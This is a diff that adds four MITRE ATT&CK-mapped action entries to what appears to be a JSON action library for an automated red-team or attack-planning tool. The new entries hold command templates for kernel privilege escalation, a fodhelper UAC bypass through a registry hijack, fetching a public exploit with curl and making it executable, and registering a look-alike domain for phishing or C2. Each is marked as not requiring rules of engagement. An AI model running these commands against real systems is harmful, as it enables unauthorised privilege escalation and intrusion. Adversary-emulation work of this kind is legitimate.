@@ -284,5 +284,107 @@
     "rules_of_engagement_required": true,
     "enrichment_quality": "hand-verified",
     "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-privesc-01",
+    "name": "exploit_kernel_privesc",
+    "mitre_technique": "T1068",
+    "mitre_tactic": "TA0004",
+    "description": "Exploit a kernel/service vulnerability to escalate from user to root/SYSTEM",
+    "source": "Atomic Red Team T1068 (hand-crafted)",
+    "command_template": "./{exploit_binary} && id",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": ["exploit_binary"],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": ["target_kernel_vulnerable"]
+    },
+    "effects": {
+      "grants_access": "root"
+    },
+    "cost": 0.3,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-privesc-02",
+    "name": "uac_bypass",
+    "mitre_technique": "T1548.002",
+    "mitre_tactic": "TA0004",
+    "description": "Bypass User Account Control to elevate from medium to high integrity",
+    "source": "Atomic Red Team T1548.002 (hand-crafted)",
+    "command_template": "fodhelper.exe   # via registry hijack on HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": ["uac_default_setting"]
+    },
+    "effects": {
+      "grants_access": "admin"
+    },
+    "cost": 0.2,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-resdev-01",
+    "name": "acquire_public_exploit",
+    "mitre_technique": "T1588.005",
+    "mitre_tactic": "TA0042",
+    "description": "Download public PoC exploit from ExploitDB / GitHub for the staged CVE",
+    "source": "Atomic Red Team T1588.005 (hand-crafted)",
+    "command_template": "curl -sSL {exploit_url} -o ./{exploit_binary} && chmod +x ./{exploit_binary}",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": ["attacker_workstation"]
+    },
+    "effects": {
+      "grants_access": "exploit_available",
+      "creates_artifact": "exploit_binary"
+    },
+    "cost": 0.2,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-resdev-02",
+    "name": "acquire_domain",
+    "mitre_technique": "T1583.001",
+    "mitre_tactic": "TA0042",
+    "description": "Register a typo-squatted or look-alike domain for phishing / C2 fronting",
+    "source": "Atomic Red Team T1583.001 (hand-crafted)",
+    "command_template": "# Out-of-band: register domain via registrar API (Namecheap / Cloudflare); attach DNS A record to {c2_ip}",
+    "preconditions": {
+      "executor": "browser",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": ["registrar_account"],
+      "required_access": "network",
+      "additional": ["attacker_workstation", "payment_method"]
+    },
+    "effects": {
+      "grants_access": "controlled_domain",
+      "creates_artifact": "attacker_domain"
+    },
+    "cost": 0.4,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
   }
 ]
